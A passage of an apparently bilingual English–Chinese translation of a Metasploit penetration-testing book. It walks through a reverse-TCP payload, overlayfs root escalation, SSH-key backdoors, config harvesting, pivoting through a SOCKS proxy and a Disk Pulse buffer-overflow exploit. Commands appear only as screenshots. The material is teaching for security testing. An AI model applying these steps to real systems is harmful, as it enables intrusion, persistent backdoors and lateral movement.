    should know where to connect to. We specify the `LHOST` and `LPORT` options for
    this very reason, where `LHOST` serves as our IP address where our listener is
    running, and `LPORT` specifies the port for the listener. We are going to use
    the payload on a Linux machine. Therefore, we specify the format (`-f`) to be
    elf, which is the default executable binary format for Linux-based operating systems.
    The `-b` option is used to specify the bad characters which may encounter problems
    in the communication and may break the shellcode. More information on bad characters
    and their evasion will follow in the upcoming chapters. Finally, we write the
    payload to the `reverse_connect.elf` file.
  id: totrans-275
  prefs: []
  type: TYPE_NORMAL
  zh: 由于我们的受损主机正在运行64位架构，我们将使用Meterpreter的64位版本，如前面的屏幕截图所示。MSFvenom根据我们的要求生成强大的有效载荷。我们使用`-p`开关指定有效载荷，它就是`linux/x64/meterpreter/reverse_tcp`。这个有效载荷是64位Linux兼容的Meterpreter有效载荷，一旦在受损系统上执行，它将连接回我们的监听器，并为我们提供对机器的访问权限。由于有效载荷必须连接回我们，它应该知道要连接到哪里。出于这个原因，我们指定了`LHOST`和`LPORT`选项，其中`LHOST`作为我们监听器运行的IP地址，`LPORT`指定监听器的端口。我们将在Linux机器上使用有效载荷。因此，我们指定格式（`-f`）为elf，这是Linux操作系统的默认可执行二进制格式。`-b`选项用于指定可能在通信中遇到问题并可能破坏shellcode的不良字符。有关不良字符及其规避的更多信息将在接下来的章节中介绍。最后，我们将有效载荷写入`reverse_connect.elf`文件。
- en: '![](img/2d3cddca-d312-4af3-a290-e2314d390641.png)'
  id: totrans-276
  prefs: []
  type: TYPE_IMG
  zh: '![](img/2d3cddca-d312-4af3-a290-e2314d390641.png)'
- en: 'Next, since we already have a PHP Meterpreter access on the machine, let''s
    upload the newly created payload using the `upload` command, which is followed
    by the path of the payload, as shown in the preceding screenshot. We can verify
    the current path of the upload by issuing the `pwd` command, which signifies the
    current directory we are working with. The uploaded payload, once executed, will
    connect back to our system. However, we need something on the receiving end as
    well to handle the connections. Let''s run a handler which will handle the incoming
    connections, as shown in the following screenshot:'
  id: totrans-277
  prefs: []
  type: TYPE_NORMAL
  zh: 接下来，由于我们已经在机器上拥有了一个PHP Meterpreter访问权限，让我们使用`upload`命令上传新创建的有效载荷，如前面的屏幕截图所示。我们可以通过发出`pwd`命令来验证上传的当前路径，这表示我们正在使用的当前目录。一旦执行了上传的有效载荷，它将连接回我们的系统。然而，我们在接收端也需要一些东西来处理连接。让我们运行一个处理程序来处理传入的连接，如下面的屏幕截图所示：
- en: '![](img/562d9ce6-42bd-4630-8055-113fcc934c3b.png)'
  id: totrans-278
  prefs: []
  type: TYPE_IMG
  zh: '![](img/562d9ce6-42bd-4630-8055-113fcc934c3b.png)'
- en: We can see that we pushed our PHP Meterpreter session to the background using
    the `background` command. Let's use the `exploit/multi/handler` module and set
    the same payload, LHOST, and LPORT we used in `reverse_connect.elf` and run the
    module using the `exploit` command.
  id: totrans-279
  prefs: []
  type: TYPE_NORMAL
  zh: 我们可以看到，我们使用`background`命令将PHP Meterpreter会话推送到后台。让我们使用`exploit/multi/handler`模块，并设置与`reverse_connect.elf`中使用的相同的有效载荷、LHOST和LPORT，然后使用`exploit`命令运行该模块。
- en: Exploiting the `-j` command starts the handler in background mode as a job and
    can handle multiple connections, all in the background.
  id: totrans-280
  prefs: []
  type: TYPE_NORMAL
  zh: 使用`-j`命令利用后台模式启动处理程序作为作业，并可以处理多个连接，全部在后台进行。
- en: 'We have successfully set up the handler. Next, we just need to execute the
    payload file on the target, as shown in the following screenshot:'
  id: totrans-281
  prefs: []
  type: TYPE_NORMAL
  zh: 我们已成功设置了处理程序。接下来，我们只需要在目标上执行有效载荷文件，如下面的屏幕截图所示：
- en: '![](img/739c2ed3-fab4-4bb9-a638-f7c72d76d3f7.png)'
  id: totrans-282
  prefs: []
  type: TYPE_IMG
  zh: '![](img/739c2ed3-fab4-4bb9-a638-f7c72d76d3f7.png)'
- en: 'We can see that we just dropped in a shell using the shell command. We checked
    the current working directory on the target using the `pwd` command. Next, we
    gave executable permissions to the payload file so we can execute it and finally,
    we ran the `reverse_connect.elf` executable in the background using the `&` identifier.
    The preceding screenshot shows that as soon as we run the executable, a new Meterpreter
    session gets opened to the target system. Using the `sessions -i` command, we
    can see that we now have two Meterpreters on the target:'
  id: totrans-283
  prefs: []
  type: TYPE_NORMAL
  zh: 我们可以看到，我们刚刚使用shell命令放置了一个shell。我们使用`pwd`命令检查了目标上的当前工作目录。接下来，我们给有效载荷文件赋予了可执行权限，以便我们可以执行它，最后，我们使用`&`标识符在后台运行了`reverse_connect.elf`可执行文件。前面的屏幕截图显示，我们一旦运行可执行文件，就会打开一个新的Meterpreter会话到目标系统。使用`sessions
    -i`命令，我们可以看到我们现在在目标上有两个Meterpreter：
- en: '![](img/0ff224d2-8ec1-4b33-bdfe-28d24cf0113c.png)'
  id: totrans-284
  prefs: []
  type: TYPE_IMG
  zh: '![](img/0ff224d2-8ec1-4b33-bdfe-28d24cf0113c.png)'
- en: 'However, x64/Linux Meterpreter is apparently a better choice over the PHP Meterpreter,
    and we will continue interacting with the system through this Meterpreter unless
    we gain a more privileged Meterpreter. However, if anything goes unplanned, we
    can switch access to the PHP Meterpreter and re-run this payload like we just
    did. An important point here is that no matter if we have got a better level of
    access type on the target, we are still a low privileged users, and we would like
    to change that. The Metasploit framework incorporates an excellent module called
    `local_exploit_suggester`, which aids privilege escalation. It has a built-in
    mechanism to check various kinds of local privilege escalation exploits and will
    suggest the best one to use on the target. We can load this module, as shown in
    the following screenshot:'
  id: totrans-285
  prefs: []
  type: TYPE_NORMAL
  zh: 然而，x64/Linux Meterpreter显然比PHP Meterpreter更好，我们将继续通过这个Meterpreter与系统交互，除非我们获得了更高权限的Meterpreter。但是，如果出现意外情况，我们可以切换访问到PHP
    Meterpreter并重新运行这个payload，就像我们刚刚做的那样。这里的一个重要点是，无论我们在目标上获得了更好的访问级别，我们仍然是低权限用户，我们希望改变这一点。Metasploit框架包含一个名为`local_exploit_suggester`的优秀模块，它有助于提升权限。它具有内置机制来检查各种本地提权利用，并建议在目标上使用最佳的利用。我们可以加载这个模块，如下面的屏幕截图所示：
- en: '![](img/996299b9-53ce-4301-8889-348b0bd734b2.png)'
  id: totrans-286
  prefs: []
  type: TYPE_IMG
  zh: '![](img/996299b9-53ce-4301-8889-348b0bd734b2.png)'
- en: 'We loaded the module using the `use` command followed by the absolute path
    of the module, which is `post/multi/recon/local_exploit_suggester`. Since we want
    to use this exploit on the target, we will naturally choose the better Meterpreter
    to route our checks. Hence, we set `SESSION` to `2` to route our check through
    `SESSION 2`, which is the identifier for x64/Linux Meterpreter. Let''s run the
    module and analyze the output:'
  id: totrans-287
  prefs: []
  type: TYPE_NORMAL
  zh: 我们使用`use`命令加载了模块，后面跟着模块的绝对路径，即`post/multi/recon/local_exploit_suggester`。由于我们想在目标上使用这个exploit，我们自然会选择更好的Meterpreter来路由我们的检查。因此，我们将`SESSION`设置为`2`，以通过`SESSION
    2`路由我们的检查，这是x64/Linux Meterpreter的标识符。让我们运行这个模块并分析输出：
- en: '![](img/c3f1c595-797e-454c-93f1-1b86eb763ea3.png)'
  id: totrans-288
  prefs: []
  type: TYPE_IMG
  zh: '![](img/c3f1c595-797e-454c-93f1-1b86eb763ea3.png)'
- en: 'Simply amazing! We can see that the `suggester` module states that the `overlayfs_priv_esc`
    local exploit module from the `exploit/linux` directory can be used on the target
    to gain root access. However, I leave it as an exercise for you all to complete.
    Let''s do it manually by downloading the local root exploit on the target, compiling
    and executing it to get root access on the target system. We can download the
    exploit from: [https://www.exploit-db.com/exploits/37292](https://www.exploit-db.com/exploits/37292).
    However, let''s gather some of the details about this exploit in the next section.'
  id: totrans-289
  prefs: []
  type: TYPE_NORMAL
  zh: 太神奇了！我们可以看到`suggester`模块表明`exploit/linux`目录中的`overlayfs_priv_esc`本地利用模块可以在目标上用于获取root访问权限。但是，我把它留给你们来完成。让我们手动在目标上下载本地root
    exploit，编译并执行它以获取目标系统的root访问权限。我们可以从以下网址下载exploit：[https://www.exploit-db.com/exploits/37292](https://www.exploit-db.com/exploits/37292)。但是，让我们在下一节中收集一些关于这个exploit的细节。
- en: Escalating privileges with local root exploits
  id: totrans-290
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 使用本地root exploit提升权限
- en: The `overlayfs` privilege escalation vulnerability allow local users to gain
    root privileges by leveraging a configuration in which `overlayfs` is permitted
    in an arbitrary mounted namespace. The weakness lies because the implementation
    of `overlayfs` does not correctly check the permissions for file creation in the
    upper filesystem directory.
  id: totrans-291
  prefs: []
  type: TYPE_NORMAL
  zh: '`overlayfs`提权漏洞允许本地用户利用允许在任意挂载的命名空间中使用`overlayfs`的配置来获取root权限。这个漏洞存在的原因是`overlayfs`的实现没有正确检查在上层文件系统目录中创建文件的权限。'
- en: 'More on the vulnerability can be found here: [https://www.cvedetails.com/cve/cve-2015-1328](https://www.cvedetails.com/cve/cve-2015-1328).'
  id: totrans-292
  prefs: []
  type: TYPE_NORMAL
  zh: 有关漏洞的更多信息可以在这里找到：[https://www.cvedetails.com/cve/cve-2015-1328](https://www.cvedetails.com/cve/cve-2015-1328)。
- en: 'Let''s drop into a shell and download the raw exploit onto the target from
    [https://www.exploit-db.com/](https://www.exploit-db.com/):'
  id: totrans-293
  prefs: []
  type: TYPE_NORMAL
  zh: 让我们进入一个shell，并从[https://www.exploit-db.com/](https://www.exploit-db.com/)下载原始exploit到目标上：
- en: '![](img/096d3a2b-1b40-490d-b44b-f69e38cb21d6.png)'
  id: totrans-294
  prefs: []
  type: TYPE_IMG
  zh: '![](img/096d3a2b-1b40-490d-b44b-f69e38cb21d6.png)'
- en: 'Let''s rename the exploit from `37292` to `37292.c` and compile it with `gcc`,
    which will generate an executable, as shown in the following screenshot:'
  id: totrans-295
  prefs: []
  type: TYPE_NORMAL
  zh: 让我们将漏洞从`37292`重命名为`37292.c`，并使用`gcc`编译它，这将生成一个可执行文件，如下面的屏幕截图所示：
- en: '![](img/74813d36-9dd8-4362-800e-09d18c321342.png)'
  id: totrans-296
  prefs: []
  type: TYPE_IMG
  zh: '![](img/74813d36-9dd8-4362-800e-09d18c321342.png)'
- en: 'We can see that we have successfully compiled the exploit, so let''s run it:'
  id: totrans-297
  prefs: []
  type: TYPE_NORMAL
  zh: 我们可以看到我们成功编译了exploit，让我们运行它：
- en: '![](img/a4a6f531-5d8d-4327-9d70-f2bc11eb014d.png)'
  id: totrans-298
  prefs: []
  type: TYPE_IMG
  zh: '![](img/a4a6f531-5d8d-4327-9d70-f2bc11eb014d.png)'
- en: 'Bingo! As we can see, by running the exploit, we have gained access to the
    root shell; this marks the total compromise of this system. Let''s run some of
    the basic commands and confirm our identity as follows:'
  id: totrans-299
  prefs: []
  type: TYPE_NORMAL
  zh: 太棒了！正如我们所看到的，通过运行exploit，我们已经获得了对root shell的访问；这标志着对这个系统的完全妥协。让我们运行一些基本命令并确认我们的身份：
- en: '![](img/3a5f3ba6-25b8-4504-afbb-09cf007ac055.png)'
  id: totrans-300
  prefs: []
  type: TYPE_IMG
  zh: '![](img/3a5f3ba6-25b8-4504-afbb-09cf007ac055.png)'
- en: 'Remember, we have an exploit handler running in the background? Let''s run
    the same `reverse_connect.elf` file:'
  id: totrans-301
  prefs: []
  type: TYPE_NORMAL
  zh: 记住，我们在后台运行了一个exploit handler？让我们运行相同的`reverse_connect.elf`文件：
- en: '![](img/e0d5504e-da05-4bec-8f9b-43450ffa4bc4.png)'
  id: totrans-302
  prefs: []
  type: TYPE_IMG
  zh: '![](img/e0d5504e-da05-4bec-8f9b-43450ffa4bc4.png)'
- en: 'Another Meterpreter session opened! Let''s see how this Meterpreter is different
    from the other two:'
  id: totrans-303
  prefs: []
  type: TYPE_NORMAL
  zh: 又打开了一个Meterpreter会话！让我们看看这个Meterpreter与其他两个有何不同：
- en: '![](img/c73702f9-e219-49b8-a9c5-7ecb0a545702.png)'
  id: totrans-304
  prefs: []
  type: TYPE_IMG
  zh: '![](img/c73702f9-e219-49b8-a9c5-7ecb0a545702.png)'
- en: 'We can see that we have the third Meterpreter from the target system. However,
    the UID, that is, the user ID, is `0`, which denotes the root user. Hence, this
    Meterpreter is running with root privileges and can provide us unrestricted entry
    to the entire system. Let''s interact with the session using the `session -i`
    command followed by the session identifier, which is `3` in this case:'
  id: totrans-305
  prefs: []
  type: TYPE_NORMAL
  zh: 我们可以看到我们从目标系统获得了第三个Meterpreter。但是，UID，也就是用户ID，是`0`，表示root用户。因此，这个Meterpreter正在以root权限运行，并且可以为我们提供对整个系统的无限制访问。让我们使用`session
    -i`命令与会话标识符交互，这种情况下是`3`：
- en: '![](img/f8873067-97fc-4ea0-83d6-cd2be1ce25b5.png)'
  id: totrans-306
  prefs: []
  type: TYPE_IMG
  zh: （图片）
- en: We can confirm the root identity through the `getuid` command, as shown in the
    preceding screenshot. We now have the complete authority of the system, so what's
    next?
  id: totrans-307
  prefs: []
  type: TYPE_NORMAL
  zh: 我们可以通过`getuid`命令确认root身份，如前面的截图所示。我们现在拥有了系统的完全权限，接下来呢？
- en: Maintaining access with Metasploit
  id: totrans-308
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 使用Metasploit保持访问
- en: 'Keeping access to the target system is a desired feature, especially when it
    comes to law enforcement agencies or by the red teams to test defenses deployed
    on the target. We can achieve persistence through Metasploit on a Linux server
    using the `sshkey_persistence` module from the `post/linux/manage` directory.
    This module adds our SSH key or creates a new one and adds it to all the users
    who exist on the target server. Therefore, the next time we want to login to the
    server, it will never ask us for a password and will simply allow us inside with
    the key. Let''s see how we can achieve this:'
  id: totrans-309
  prefs: []
  type: TYPE_NORMAL
  zh: 保持对目标系统的访问是一个理想的功能，特别是在执法机构或红队测试目标上部署的防御时。我们可以通过Metasploit在Linux服务器上使用`post/linux/manage`目录中的`sshkey_persistence`模块实现持久性。该模块添加了我们的SSH密钥或创建一个新的密钥，并将其添加到目标服务器上存在的所有用户。因此，下次我们想登录到服务器时，它将不会要求我们输入密码，而只会使用密钥让我们进入。让我们看看我们如何实现这一点：
- en: '![](img/eca5b751-2d1b-42d4-8ddc-c504b4f84e13.png)'
  id: totrans-310
  prefs: []
  type: TYPE_IMG
  zh: （图片）
- en: 'We just need to set the session identifier using the set `SESSION` command
    followed by the session identifier. We will make use of the session with the highest
    level of privileges. Hence, we will use `3` as the `SESSION` identifier and directly
    run the module as follows:'
  id: totrans-311
  prefs: []
  type: TYPE_NORMAL
  zh: 我们只需要使用`set SESSION`命令设置会话标识符，然后使用具有最高特权级别的会话。因此，我们将使用`3`作为`SESSION`标识符，并直接运行模块，如下所示：
- en: '![](img/a5df713b-4167-47b0-8fd5-42592095d422.png)'
  id: totrans-312
  prefs: []
  type: TYPE_IMG
  zh: （图片）
- en: 'We can see that the module created a new SSH key and then added it to two users
    on the target system, that is, `root` and `claire`. We can verify our backdoor
    access by connecting to the target on SSH with either `root` or the user `claire`,
    or both, as follows:'
  id: totrans-313
  prefs: []
  type: TYPE_NORMAL
  zh: 我们可以看到该模块创建了一个新的SSH密钥，然后将其添加到目标系统上的两个用户，即`root`和`claire`。我们可以通过使用SSH连接到目标，使用`root`或用户`claire`，或两者，来验证我们的后门访问，如下所示：
- en: '![](img/12719d71-cac2-48c9-9786-af0760f17e0d.png)'
  id: totrans-314
  prefs: []
  type: TYPE_IMG
  zh: （图片）
- en: 'Amazing! We can see that we logged into the target system by making use of
    the newly created SSH key using the `-i` option, as shown in the preceding screen.
    Let''s see if we can also log in as the user `claire`:'
  id: totrans-315
  prefs: []
  type: TYPE_NORMAL
  zh: 太棒了！我们可以看到我们通过使用新创建的SSH密钥登录到目标系统，使用了`-i`选项，如前面的屏幕所示。让我们看看我们是否也可以作为用户`claire`登录：
- en: '![](img/f97a920f-15e8-42f0-819e-f1aa41393086.png)'
  id: totrans-316
  prefs: []
  type: TYPE_IMG
  zh: （图片）
- en: Yup! We can log in with both of the backdoored users.
  id: totrans-317
  prefs: []
  type: TYPE_NORMAL
  zh: 是的！我们可以使用两个后门用户登录。
- en: Most of the servers do not permit root login. Hence, you can edit the `sshd
    config` file and change the root login to `yes` and restart the SSH service on
    the target.
  id: totrans-318
  prefs: []
  type: TYPE_NORMAL
  zh: 大多数服务器不允许root登录。因此，您可以编辑`sshd config`文件，将root登录更改为`yes`，并在目标上重新启动SSH服务。
- en: Try to backdoor only a single user such as the root since, most of the folks
    won't log in through the root as default configurations prohibit it.
  id: totrans-319
  prefs: []
  type: TYPE_NORMAL
  zh: 尝试只给一个用户后门，比如root，因为大多数人不会通过root登录，因为默认配置禁止了这样做。
- en: Post-exploitation and pivoting
  id: totrans-320
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 后渗透和转向
- en: 'No matter what operating system we have compromised, Metasploit offers a dozen
    of post-exploitation reconnaissance modules which harvest gigs of data from the
    compromised machine. Let''s make use of one such module:'
  id: totrans-321
  prefs: []
  type: TYPE_NORMAL
  zh: 无论我们已经攻陷了什么操作系统，Metasploit都提供了数十个后渗透侦察模块，可以从受损的机器中收集大量数据。让我们使用其中一个模块：
- en: '![](img/1c527fa7-577a-49e8-b60d-4b5fed94f7f2.png)'
  id: totrans-322
  prefs: []
  type: TYPE_IMG
  zh: （图片）
- en: 'Running the `enum_configs` post-exploitation module, we can see that we have
    gathered all the configuration files which existed on the target. These configs
    help uncover passwords, password patterns, information about the services running,
    and much much more. Another great module is `enum_system`, which harvests information
    such as OS-related information, user accounts, services running, cron jobs running,
    disk information, log files, and much more, as shown in the following screenshot:'
  id: totrans-323
  prefs: []
  type: TYPE_NORMAL
  zh: 运行`enum_configs`后渗透模块，我们可以看到我们已经收集了目标上存在的所有配置文件。这些配置帮助我们发现密码、密码模式、关于正在运行的服务的信息，以及更多其他信息。另一个很棒的模块是`enum_system`，它收集了与操作系统相关的信息、用户账户、正在运行的服务、正在运行的定时作业、磁盘信息、日志文件等等，如下面的截图所示：
- en: '![](img/514014ea-f3f2-4a6d-bc07-4ed7a8904b3f.png)'
  id: totrans-324
  prefs: []
  type: TYPE_IMG
  zh: （图片）
- en: 'Having gathered an enormous amount of detail on the target, is it a good time
    to start reporting? Not yet. A good penetration tester gains access to the system,
    obtains the highest level of access, and presents his analysis. However, a great
    penetration tester does the same but never stops on a single system. They will
    try with the best of his abilities to dive into the internal network and gain
    more access to the network (if allowed). Let''s use some of the commands which
    will aid us in pivoting to the internal network. One such example command is `arp`,
    which lists down all the contracted systems in the internal network:'
  id: totrans-325
  prefs: []
  type: TYPE_NORMAL
  zh: 在目标上收集了大量详细信息后，是不是该开始报告了呢？还不是。一个优秀的渗透测试人员会获取系统访问权限，获得最高级别的访问权限，并提出他的分析。然而，一个优秀的渗透测试人员会做同样的事情，但永远不会停留在一个单一的系统上。他们会尽力进入内部网络，并获得更多对网络的访问权限（如果允许的话）。让我们使用一些命令来帮助我们转向内部网络。一个这样的例子是`arp`命令，它列出内部网络中的所有已连接系统：
- en: '![](img/dc78c65c-0519-4b5c-b630-5bdfbf140de5.png)'
  id: totrans-326
  prefs: []
  type: TYPE_IMG
  zh: （图片）
- en: 'We can see the presence of a separate network, which is in the `192.168.116.0`
    range. Let''s issue the `ifconfig` command and see if there is another network
    adapter attached to the compromised host:'
  id: totrans-327
  prefs: []
  type: TYPE_NORMAL
  zh: 我们可以看到一个单独的网络存在，它在`192.168.116.0`范围内。让我们发出`ifconfig`命令，看看受损主机上是否连接了另一个网络适配器：
- en: '![](img/b7ab8431-3235-43d4-a215-3fd5e30b6b9a.png)'
  id: totrans-328
  prefs: []
  type: TYPE_IMG
  zh: （图片）
- en: 'Yup! We got it right-there is another network adapter (`Interface 3`) which
    is connected to a separate network range. However, when we try to ping or scan
    this network from our address range, we are not able to because the network is
    unreachable from our IP address, which means we need a mechanism that can forward
    data from our system to the target (otherwise inaccessible) range through the
    compromised host itself. We call this arrangement pivoting. Therefore, we will
    add a route to the target range through our gained Meterpreter on the system,
    and the target systems in the range will see our compromised host as the source
    originator. Let''s add a route to the otherwise unreachable range through Meterpreter,
    as shown in the following screenshot:'
  id: totrans-329
  prefs: []
  type: TYPE_NORMAL
  zh: 是的！我们做对了-还有另一个网络适配器（`Interface 3`）连接到一个单独的网络范围。然而，当我们尝试从我们的地址范围对这个网络进行ping或扫描时，我们无法做到，因为从我们的IP地址无法访问该网络，这意味着我们需要一种可以通过受损主机将数据从我们的系统转发到目标（否则无法访问）范围的机制。我们称这种安排为枢纽。因此，我们将通过我们获得的Meterpreter在系统上添加到目标范围的路由，并且范围内的目标系统将把我们的受损主机视为源发起者。让我们通过Meterpreter添加到否则无法访问的范围的路由，如下截图所示：
- en: '![](img/76ecb319-5ce7-49b4-8609-7b04abb2b1f1.png)'
  id: totrans-330
  prefs: []
  type: TYPE_IMG
  zh: '![](img/76ecb319-5ce7-49b4-8609-7b04abb2b1f1.png)'
- en: 'Using the `autoroute` post-exploitation module from `post/multi/manage` directory,
    we need to specify the target range in the `SUBNET` parameter and `SESSION` to
    the session identifier of the Meterpreter through which data would be tunneled.
    We can see that by running the module, we have successfully added a route to the
    target range. Let''s run the TCP port scanner module from Metasploit and analyze
    whether we can scan hosts in the target range or not:'
  id: totrans-331
  prefs: []
  type: TYPE_NORMAL
  zh: 使用`post/multi/manage`目录下的`autoroute`后渗透模块，我们需要在`SUBNET`参数中指定目标范围，并将`SESSION`设置为Meterpreter的会话标识符，通过该会话数据将被隧道传输。通过运行该模块，我们可以看到已成功添加了到目标范围的路由。让我们运行Metasploit的TCP端口扫描模块，并分析我们是否可以扫描目标范围内的主机：
- en: '![](img/0d509e82-111c-4eb4-8092-d44d0990316a.png)'
  id: totrans-332
  prefs: []
  type: TYPE_IMG
  zh: '![](img/0d509e82-111c-4eb4-8092-d44d0990316a.png)'
- en: 'We simply run the `portscanner` module on the target we found using the `arp`
    command, that is, `192.168.116.133` with ten threads for ports 1-10000, as shown
    in preceding screenshot:'
  id: totrans-333
  prefs: []
  type: TYPE_NORMAL
  zh: 我们只需在找到的目标上运行`portscanner`模块，即使用`arp`命令找到的`192.168.116.133`，使用10个线程扫描端口1-10000，如前面的截图所示：
- en: '![](img/2fe2a452-de7c-44ca-b28f-1ddb07992325.png)'
  id: totrans-334
  prefs: []
  type: TYPE_IMG
  zh: '![](img/2fe2a452-de7c-44ca-b28f-1ddb07992325.png)'
- en: 'Success! We can see that port `80` is open. However, our access is limited
    through Meterpreter only. We need a mechanism where we can run some of our external
    tools for browsing port `80` through a web browser to understand more about the
    target application running on port `80`. Metasploit offers an inbuilt socks proxy
    module which we can run and route traffic from our external applications to the
    target `192.168.116.133` system. Let''s use this module as follows:'
  id: totrans-335
  prefs: []
  type: TYPE_NORMAL
  zh: 成功！我们可以看到端口`80`是开放的。然而，我们只能通过Meterpreter进行访问。我们需要一种机制，可以通过Web浏览器运行一些外部工具来浏览端口`80`，以了解更多关于运行在端口`80`上的目标应用程序。Metasploit提供了一个内置的socks代理模块，我们可以运行它，并将流量从我们的外部应用程序路由到目标`192.168.116.133`系统。让我们按照以下方式使用这个模块：
- en: '![](img/d5778e6f-b5b5-4155-8487-4cb824c4e999.png)'
  id: totrans-336
  prefs: []
  type: TYPE_IMG
  zh: '![](img/d5778e6f-b5b5-4155-8487-4cb824c4e999.png)'
- en: 'We simply need to run the `socks4a` module residing at the `auxiliary/server`
    path. It will set up a gateway on the local port, `1080`, to route the traffic
    to the target system. Proxying on `127.0.0.1:1080` will forward our browser traffic
    through the compromised host. However, for external tools, we will need to use
    `proxychains` and configure it by setting the port to `1080`. The port for `proxychains`
    can be configured using the `/etc/proxychains.conf` file:'
  id: totrans-337
  prefs: []
  type: TYPE_NORMAL
  zh: 我们只需要运行位于`辅助/服务器`路径下的`socks4a`模块。它将在本地端口`1080`上设置一个网关，将流量路由到目标系统。在`127.0.0.1:1080`上代理将通过受损主机转发我们的浏览器流量。然而，对于外部工具，我们需要使用`proxychains`并通过将端口设置为`1080`来配置它。`proxychains`的端口可以使用`/etc/proxychains.conf`文件进行配置：
- en: '![](img/394be665-3461-43d9-9d0c-39e8ed03e26b.png)'
  id: totrans-338
  prefs: []
  type: TYPE_IMG
  zh: '![](img/394be665-3461-43d9-9d0c-39e8ed03e26b.png)'
- en: 'The next thing is to only set this address as a proxy in the browser or use
    `proxychains` as the prefix on all the third-party command-line applications such
    as Nmap and Metasploit. We can configure the browser, as shown in the following
    screenshot:'
  id: totrans-339
  prefs: []
  type: TYPE_NORMAL
  zh: 接下来的事情就是在浏览器中将该地址设置为代理，或者在所有第三方命令行应用程序（如Nmap和Metasploit）中使用`proxychains`作为前缀。我们可以根据以下截图配置浏览器：
- en: '![](img/e0fde74f-ea23-4108-b716-a6d0fa611279.png)'
  id: totrans-340
  prefs: []
  type: TYPE_IMG
  zh: '![](img/e0fde74f-ea23-4108-b716-a6d0fa611279.png)'
- en: 'Make sure to remove `localhost` and `127.0.0.1` from the No Proxy for section.
    After setting the proxy, we can just browse to the IP address on port `80` and
    check whether we can reach port `80`:'
  id: totrans-341
  prefs: []
  type: TYPE_NORMAL
  zh: 确保从“无代理”部分中删除`localhost`和`127.0.0.1`。设置代理后，我们只需在端口`80`上浏览IP地址，并检查是否可以到达端口`80`：
- en: '![](img/baf343c3-2a67-4a2b-a2f8-088edac20c3d.png)'
  id: totrans-342
  prefs: []
  type: TYPE_IMG
  zh: '![](img/baf343c3-2a67-4a2b-a2f8-088edac20c3d.png)'
- en: 'Nice! We can see the application, which says it''s a Disk Pulse Enterprise,
    Software v9.9.16, which is a known vulnerable version. We have plenty of modules
    for Disk Pulse in Metasploit. Let''s make use of one of them, as follows:'
  id: totrans-343
  prefs: []
  type: TYPE_NORMAL
  zh: 不错！我们可以看到应用程序，它说它是Disk Pulse Enterprise，软件版本9.9.16，这是一个已知的有漏洞的版本。在Metasploit中，我们有很多关于Disk
    Pulse的模块。让我们使用其中一个，如下所示：
- en: '![](img/79066548-c7f4-421a-acb5-d8fcded486f2.png)'
  id: totrans-344
  prefs: []
  type: TYPE_IMG
  zh: '![](img/79066548-c7f4-421a-acb5-d8fcded486f2.png)'
- en: Yup! I am one of the original authors of this exploit module. Let's understand
    the vulnerability before exploiting it.
  id: totrans-345
  prefs: []
  type: TYPE_NORMAL
  zh: 是的！我是这个漏洞利用模块的原始作者之一。在利用之前，让我们了解一下这个漏洞。
- en: Vulnerability analysis - SEH based buffer overflow
  id: totrans-346
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 漏洞分析-基于SEH的缓冲区溢出
- en: The vulnerability lies in parsing the `GET` request by the web server component
    of Disk Pulse 9.9.16\. An attacker can craft malicious `GET` requests and cause
    the SEH frame to overwrite, which will cause the attacker to gain complete access
    to the program's flow. The attacker will gain full access to the system with the
    highest level of privileges since Disk Pulse runs with Administrator rights.
  id: totrans-347
  prefs: []
  type: TYPE_NORMAL
  zh: 漏洞在Disk Pulse 9.9.16的Web服务器组件解析`GET`请求时存在。攻击者可以构造恶意的`GET`请求并导致SEH帧被覆盖，这将使攻击者完全访问程序的流程。由于Disk
    Pulse以管理员权限运行，攻击者将获得系统的完全访问权限。
- en: 'Let''s make use of the vulnerability and exploit the system as follows:'
  id: totrans-348
  prefs: []
  type: TYPE_NORMAL
  zh: 让我们利用漏洞并利用系统，如下所示：
- en: '![](img/33dc98f7-0346-46ee-9fc6-32ea46a20045.png)'
  id: totrans-349
  prefs: []
  type: TYPE_IMG
  zh: '![](img/33dc98f7-0346-46ee-9fc6-32ea46a20045.png)'
- en: 'Merely setting the `RHOST` and the `LPORT` (Gateway port which will allow us
    access to the successful exploitation of the target), we are ready to exploit
    the system. We can see that as soon as we run the exploit, we have Meterpreter
    session `5` opened, which marks a successful compromise of the target. We can
    verify our list of sessions using the `sessions -i` command as follows:'
  id: totrans-350
  prefs: []
  type: TYPE_NORMAL
  zh: 只需设置`RHOST`和`LPORT`（将允许我们访问目标成功利用的网关端口），我们就可以准备利用系统。我们可以看到，一旦我们运行了利用程序，我们就打开了Meterpreter会话`5`，这标志着成功入侵了目标。我们可以使用`sessions
    -i`命令验证我们的会话列表，如下所示：
- en: '![](img/0a818b99-f6b6-44df-b0dd-6fb4f5fba0fc.png)'
  id: totrans-351
  prefs: []
  type: TYPE_IMG
  zh: '![](img/0a818b99-f6b6-44df-b0dd-6fb4f5fba0fc.png)'
- en: 'Let''s interact with session `5` and check the level of access we have:'
  id: totrans-352
  prefs: []
  type: TYPE_NORMAL
  zh: 让我们与会话`5`进行交互，并检查我们拥有的访问级别：
- en: '![](img/69d94fb4-025d-4309-bd85-92afad97e95f.png)'
  id: totrans-353
  prefs: []
  type: TYPE_IMG
  zh: '![](img/69d94fb4-025d-4309-bd85-92afad97e95f.png)'
- en: Issuing the `getuid` command, we can see that we already have `NT AUTHORITY
    SYSTEM`, the highest level of privilege on the Windows OS.
  id: totrans-354
  prefs: []
  type: TYPE_NORMAL
  zh: 发出`getuid`命令，我们可以看到我们已经拥有Windows操作系统上的最高特权`NT AUTHORITY SYSTEM`。
- en: 'For more information on the vulnerability, refer to: [http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-13696](http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-13696).'
  id: totrans-355
  prefs: []
  type: TYPE_NORMAL
  zh: 有关此漏洞的更多信息，请参阅：[http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-13696](http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-13696)。
- en: Exploiting human errors by compromising Password Managers
  id: totrans-356
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 通过入侵密码管理器来利用人为错误
- en: 'Having the highest level of privileges, let''s perform some post-exploitation
    as follows:'
  id: totrans-357
  prefs: []
  type: TYPE_NORMAL
